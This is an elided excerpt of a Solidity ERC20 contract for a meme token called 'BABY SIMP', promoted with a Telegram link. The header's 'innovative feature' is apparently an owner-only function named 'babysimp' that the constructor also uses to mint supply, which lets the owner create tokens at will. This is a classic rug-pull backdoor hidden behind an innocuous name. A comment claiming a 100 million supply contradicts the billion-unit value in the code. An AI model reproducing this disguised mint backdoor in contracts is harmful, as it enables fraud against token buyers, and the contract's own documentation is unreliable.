...
//
// $BabySimp proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/BabySIMPtoken
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function babysimp(uint256 amount) public onlyOwner {
    _babysimp(msg.sender, amount);
    }
    ...
    function _babysimp(address account, uint256 amount) internal virtual {
...
contract BABYSIMP is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BABY SIMP", "BSP") {
        _babysimp(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}